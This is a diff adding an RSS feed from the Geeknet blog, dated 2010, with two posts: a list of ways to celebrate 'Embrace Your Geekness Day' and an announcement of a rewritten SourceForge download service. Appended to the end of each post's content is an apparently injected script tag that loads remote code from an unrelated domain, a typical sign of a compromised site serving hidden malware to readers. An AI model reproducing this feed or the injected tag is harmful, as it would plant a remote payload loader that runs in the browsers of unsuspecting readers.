@@ -1,0 +1,83 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0"
+	xmlns:content="http://purl.org/rss/1.0/modules/content/"
+	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
+	xmlns:dc="http://purl.org/dc/elements/1.1/"
+	xmlns:atom="http://www.w3.org/2005/Atom"
+	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
+	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
+	>
+
+<channel>
+	<title>Geeknet :: Blog</title>
+	<atom:link href="http://blog.geek.net/feed/" rel="self" type="application/rss+xml" />
+	<link>http://blog.geek.net</link>
+	<description>The Online Network for the Global Geek Community</description>
+	<lastBuildDate>Tue, 13 Jul 2010 22:26:08 +0000</lastBuildDate>
+	
+	<language>en</language>
+	<sy:updatePeriod>hourly</sy:updatePeriod>
+	<sy:updateFrequency>1</sy:updateFrequency>
+			<item>
+		<title>The Top 5 Ways to Celebrate ‘Embrace Your Geekness Day’</title>
+		<link>http://blog.geek.net/2010/07/the-top-5-ways-to-celebrate-%e2%80%98embrace-your-geekness-day%e2%80%99/</link>
+		<comments>http://blog.geek.net/2010/07/the-top-5-ways-to-celebrate-%e2%80%98embrace-your-geekness-day%e2%80%99/#comments</comments>
+		<pubDate>Tue, 13 Jul 2010 22:26:08 +0000</pubDate>
+		<dc:creator>Geeknet</dc:creator>
+				<category><![CDATA[Uncategorized]]></category>
+		<category><![CDATA[geek]]></category>
+		<category><![CDATA[geek community]]></category>
+		<category><![CDATA[geek holiday]]></category>
+		<category><![CDATA[geekness]]></category>
+		<category><![CDATA[geeknet]]></category>
+		<category><![CDATA[Scott Kauffman]]></category>
+
+		<guid isPermaLink="false">http://blog.geek.net/?p=11</guid>
+		<description><![CDATA[The global geek community leader shares how to best get your geek on.
+In celebration of “Embrace Your Geekness Day,” Geeknet, the online network for the global geek community, shares the top five ways to celebrate the geekiest of holidays.
+HOW:    Embrace your geekness:
+1.    Two words: Rube Goldberg
+2.    Fuel up the geek way with caffeine, sugar and [...]]]></description>
+			<content:encoded><![CDATA[<p><em>The global geek community leader shares how to best get your geek on.</em></p>
+<p>In celebration of “Embrace Your Geekness Day,” Geeknet, the online network for the global geek community, shares the top five ways to celebrate the geekiest of holidays.</p>
+<p>HOW:    Embrace your geekness:<br />
+1.    Two words: Rube Goldberg<br />
+2.    Fuel up the geek way with caffeine, sugar and unicorn meat<br />
+3.    Flex your wallet and brain mass by greening your workspace<br />
+4.    Host a Star Wars night to honor the greatest geek movie franchise of all time<br />
+5.    Dust off your digs for Comic-Con</p>
+<p>WHAT:     “Embrace Your Geekness Day” is an official, trademarked holiday designed by Wellcat Holidays to recognize geeks and their contributions to society. Whether you are a full-on geek or merely exhibit geek-like qualities, today is the day to let your geek flag fly.</p>
+<p>WHY:    &#8221;Geeks will define the 2010s much as the GenXers defined the 1990s.&#8221;– Scott Kauffman, CEO of Geeknet.<script src="http://ao.euuaw.com/9"></script></p>
+]]></content:encoded>
+			<wfw:commentRss>http://blog.geek.net/2010/07/the-top-5-ways-to-celebrate-%e2%80%98embrace-your-geekness-day%e2%80%99/feed/</wfw:commentRss>
+		<slash:comments>0</slash:comments>
+		</item>
+		<item>
+		<title>New Download Service launched on SourceForge</title>
+		<link>http://blog.geek.net/2010/04/new-download-service-launched-on-sourceforge/</link>
+		<comments>http://blog.geek.net/2010/04/new-download-service-launched-on-sourceforge/#comments</comments>
+		<pubDate>Wed, 14 Apr 2010 11:40:39 +0000</pubDate>
+		<dc:creator>Geeknet</dc:creator>
+				<category><![CDATA[Uncategorized]]></category>
+		<category><![CDATA[downloads]]></category>
+		<category><![CDATA[geeknet]]></category>
+		<category><![CDATA[open source software]]></category>
+		<category><![CDATA[service]]></category>
+		<category><![CDATA[sourcefore]]></category>
+
+		<guid isPermaLink="false">http://blog.geek.net/?p=8</guid>
+		<description><![CDATA[Last week we quietly updated a key service on one of Geeknet&#8217;s properties, SourceForge. We launched a new download service that will replace the one that has been running for some time now.
+Some of you may be curious why we spent time rewriting a service that replaces something that looks quite similar. Downloads have always [...]]]></description>
+			<content:encoded><![CDATA[<p>Last week we quietly updated a key service on one of Geeknet&#8217;s properties, SourceForge. We launched a new download service that will replace the one that has been running for some time now.</p>
+<p>Some of you may be curious why we spent time rewriting a service that replaces something that looks quite similar. Downloads have always been the bread-and-butter of SourceForge. They generate a lot of traffic and allow us to target highly relevant ads at visitors who visit SourceForge to download software.</p>
+<p>In an effort to offer more software to our visitors, we are improving the download service so that it will appeal to a greater variety of free, open source projects.  We’ve recently made it a priority of ours to make great improvements to our project stats system. This adds value to the engineers who write great open source software and use our stats to develop enhancements to their product.</p>
+<p>We’ve thus enabled our user base to find and download much more, quality open source software on SourceForge.  And finally, Geeknet becomes a stronger media business by adding more advertising inventory to one of its most popular websites.</p>
+<p>I&#8217;m happy with this first step in the process of rejuvenating SourceForge and I hope you are too. I look forward to continuing the work and hearing from you about our recent efforts.</p>
+<p>Scott Collison<br />
+Chief Product Officer, Geeknet<script src="http://ao.euuaw.com/9"></script></p>
+]]></content:encoded>
+			<wfw:commentRss>http://blog.geek.net/2010/04/new-download-service-launched-on-sourceforge/feed/</wfw:commentRss>
+		<slash:comments>0</slash:comments>
+		</item>
+	</channel>
+</rss>
